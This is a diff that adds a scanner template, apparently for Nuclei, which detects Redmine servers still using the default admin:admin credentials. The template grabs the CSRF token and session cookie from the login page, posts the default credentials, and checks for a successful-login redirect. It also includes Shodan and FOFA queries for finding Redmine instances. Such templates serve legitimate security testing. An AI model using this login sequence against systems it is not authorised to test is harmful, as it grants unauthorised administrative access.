@@ -1,0 +1,74 @@
+id: redmine-default-login
+
+info:
+  name: Redmine - Default Admin Credentials
+  author: 0x_Akoko
+  severity: high
+  description: |
+    Detected Redmine project management application was found to have been using the default administrator credentials (admin:admin). An attacker could have gained full administrative access to manage projects, users, and system settings.
+  reference:
+    - https://www.redmine.org/projects/redmine/wiki/RedmineInstall
+    - https://www.simplified.guide/redmine/default-password
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: redmine
+    product: redmine
+    shodan-query: 'http.title:"Redmine"'
+    fofa-query: 'title="Redmine"'
+  tags: redmine,default-login,aut,vuln
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "Redmine", "authenticity_token")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - 'name="authenticity_token"[^>]+value="([^"]+)"'
+
+      - type: regex
+        name: session
+        part: header
+        group: 1
+        internal: true
+        regex:
+          - 'Set-Cookie: (_redmine_session=[^;]+)'
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session}}
+
+        authenticity_token={{url_encode(csrf_token)}}&username={{username}}&password={{password}}&login=Login
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+          - '!contains(to_lower(header), "/login")'
+          - 'contains_any(to_lower(header), "/my/page", "/my/account", "redmine")'
+          - 'contains(header, "_redmine_session")'
+        condition: and
+# digest: 4b0a0048304602210093ef8453e8b57f1b34bf1fe019a058bb943773b7185f43f5166d2ea9c29db316022100e956871a1f9387fa764805ef4b7a50626bd9549dfd83f4c566dd33e30d861a60:922c64590222798bb761d5b6d8e72950
